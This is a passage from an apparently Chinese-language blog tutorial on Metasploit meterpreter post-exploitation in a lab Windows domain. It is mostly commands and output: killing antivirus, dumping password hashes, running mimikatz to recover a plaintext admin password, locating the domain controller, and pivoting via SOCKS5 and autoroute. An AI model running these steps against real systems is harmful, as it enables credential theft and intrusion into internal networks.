title="查看当前用户权限"></a>查看当前用户权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看权限</span><br></pre></td></tr></table></figure><h5 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WEB</span><br><span class="line">OS              : Windows <span class="number">2008</span> R2 (<span class="number">6.1</span> Build <span class="number">7601</span>, Service Pack <span class="number">1</span>).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : DE1AY</span><br><span class="line">Logged On Users : <span class="number">3</span></span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure><h5 id="获取软件安装信息"><a href="#获取软件安装信息" class="headerlink" title="获取软件安装信息"></a>获取软件安装信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WEB</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                                                  Version</span><br><span class="line"> ----                                                                                  -------</span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br></pre></td></tr></table></figure><h5 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure><h5 id="判断是否是虚拟机"><a href="#判断是否是虚拟机" class="headerlink" title="判断是否是虚拟机"></a>判断是否是虚拟机</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h5 id="查看补丁信息"><a href="#查看补丁信息" class="headerlink" title="查看补丁信息"></a>查看补丁信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /Users/apple/.msf4/loot/<span class="number">20200906182724</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_enum_patches_447671.txt</span><br><span class="line">[*] KB2534111 applied</span><br><span class="line">[*] KB2999226 applied</span><br><span class="line">[*] KB976902 applied</span><br></pre></td></tr></table></figure><h5 id="Hash与明文密码获取"><a href="#Hash与明文密码获取" class="headerlink" title="Hash与明文密码获取"></a>Hash与明文密码获取</h5><p>获取目标机系统用户Hash</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one <span class="keyword">is</span> connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /Users/apple/.msf4/loot/<span class="number">20200903163754</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_windows.hashes_560643.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running <span class="keyword">as</span> SYSTEM extracting hashes <span class="keyword">from</span> registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*] Obtaining the user list <span class="keyword">and</span> keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users <span class="keyword">with</span> password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] whoami:<span class="number">1004</span>:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::</span><br><span class="line">[+] steady:<span class="number">1012</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br><span class="line">[+] steady123:<span class="number">1013</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br></pre></td></tr></table></figure><p>获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload mimikatz.exe 目标位置</span><br></pre></td></tr></table></figure><p>mimikatz的使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">c:\\mimikatz.exe</span><br><span class="line"></span><br><span class="line">c:\&gt;mimikatz.exe</span><br><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords</span></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">2499588</span> (<span class="number">00000000</span>:<span class="number">00262404</span>)</span><br><span class="line">Session           : Interactive <span class="keyword">from</span> <span class="number">1</span></span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : OWA</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">9</span>/<span class="number">3</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">09</span></span><br><span class="line">SID               : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span><span class="number">-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * LM       : <span class="number">3333</span>deaae325ebb705026d3fb1a43796</span><br><span class="line"> * NTLM     : <span class="number">7</span>d0e302e0cbd94d9353ac4a51d7c39c1</span><br><span class="line"> * SHA1     : d4f206f0d8303230185b2ff2fedb7d40a62effa5</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><p>如果当前用户没有足够的权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WEB</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one <span class="keyword">is</span> connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /Users/apple/.msf4/loot/<span class="number">20201012180509</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.13</span>_windows.hashes_113739.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[-] On this version of Windows you need to be NT AUTHORITY\SYSTEM to dump the hashes</span><br><span class="line">[-] Try setting GETSYSTEM to true.</span><br></pre></td></tr></table></figure><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><h5 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: god</span><br><span class="line">[+] FOUND Domain Controller: owa (IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span>)</span><br></pre></td></tr></table></figure><h5 id="ifconfig查看DNS服务器地址"><a href="#ifconfig查看DNS服务器地址" class="headerlink" title="ifconfig查看DNS服务器地址"></a>ifconfig查看DNS服务器地址</h5><h4 id="代理与端口设置"><a href="#代理与端口设置" class="headerlink" title="代理与端口设置"></a>代理与端口设置</h4><h5 id="设置sockets5代理"><a href="#设置sockets5代理" class="headerlink" title="设置sockets5代理"></a>设置sockets5代理</h5><p>搜索一下可用代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search socks</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                     Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                     ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/scanner/http/sockso_traversal  <span class="number">2012</span><span class="number">-03</span><span class="number">-14</span>       normal  No     Sockso Music Host Server <span class="number">1.5</span> Directory Traversal</span><br><span class="line">   <span class="number">1</span>  auxiliary/server/socks4a                                  normal  No     Socks4a Proxy Server</span><br><span class="line">   <span class="number">2</span>  auxiliary/server/socks5                                   normal  No     Socks5 Proxy Server</span><br><span class="line">   <span class="number">3</span>  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection</span><br></pre></td></tr></table></figure><p>设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks5</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks5):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   SRVHOST   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The address to listen on</span><br><span class="line">   SRVPORT   <span class="number">1080</span>             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVHOST <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">SRVHOST =&gt; 127.0.0.1</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVPORT <span class="number">5555</span></span><br><span class="line">SRVPORT =&gt; 5555</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running <span class="keyword">as</span> background job <span class="number">0.</span></span><br><span class="line">msf5 auxiliary(server/socks5) &gt;</span><br><span class="line">[*] Starting the socks5 proxy server</span><br></pre></td></tr></table></figure><p>然后也可以直接使用一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set proxies socks5:127.0.0.1:8990  设置代理</span><br><span class="line">setg ReverseAllowProxy true 允许反向代理</span><br></pre></td></tr></table></figure><p>获取内网网段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">169.254</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p>查看是否添加成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">198.168</span><span class="number">.52</span><span class="number">.0</span>       <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ARP扫描内网主机</p><h5 id="添加去往”内网网段”的路由"><a href="#添加去往”内网网段”的路由" class="headerlink" title="添加去往”内网网段”的路由"></a>添加去往”内网网段”的路由</h5><ul><li><p>MSF 路由添加帮助查询命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s <span class="number">10.1</span><span class="number">.1</span><span class="number">.0</span> -n <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="comment"># Add a route to 10.10.10.1/255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>                 <span class="comment"># Netmask defaults to 255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span>              <span class="comment"># CIDR notation is also okay</span></span><br><span class="line">[*]   run autoroute -p                            <span class="comment"># Print active routing table</span></span><br><span class="line">[*]   run autoroute -d -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>              <span class="comment"># Deletes the 10.10.10.1/255.255.255.0 route</span></span><br><span class="line">[*] Use the <span class="string">&quot;route&quot;</span> <span class="keyword">and</span> <span class="string">&quot;ipconfig&quot;</span> Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br></pre></td></tr></table></figure></li><li><p>获取目标内网地址段 </p><p>具体获取被攻击目标内网地址网段的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>由上可以获知，目标内网网段是“172.17.0.0./24”</p></li><li><p>添加去往目标网段的转发路由 </p><p>在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>...</span><br><span class="line">[+] Added route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> via <span class="number">10.48</span><span class="number">.8</span><span class="number">.234</span></span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure></li><li><p>添加网路由后，我们来查看下路由的添加情况如何</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">3</span></span><br></pre></td></tr></table></figure></li></ul><p>将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p><ul><li><p>删除路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 172.20.10.0</span><br></pre></td></tr></table></figure></li></ul><h4 id="autoroute模块"><a href="#autoroute模块" class="headerlink" title="autoroute模块"></a>autoroute模块</h4><h5 id="获取当前机器的所有网段信息"><a href="#获取当前机器的所有网段信息" class="headerlink" title="获取当前机器的所有网段信息"></a>获取当前机器的所有网段信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br></pre></td></tr></table></figure><h5 id="添加目标内网网段的路由"><a href="#添加目标内网网段的路由" class="headerlink" title="添加目标内网网段的路由"></a>添加目标内网网段的路由</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br><span class="line">[+] Added route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span> via <span class="number">172.20</span>.<span class="number">10.13</span></span><br><span class="line">[*] Use the -p option <span class="keyword">to</span> list all active routes</span><br></pre></td></tr></table></figure><h5 id="打印当前添加的路由表信息"><a href="#打印当前添加的路由表信息" class="headerlink" title="打印当前添加的路由表信息"></a>打印当前添加的路由表信息</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">10.10</span>.<span class="number">10.0</span>         <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span 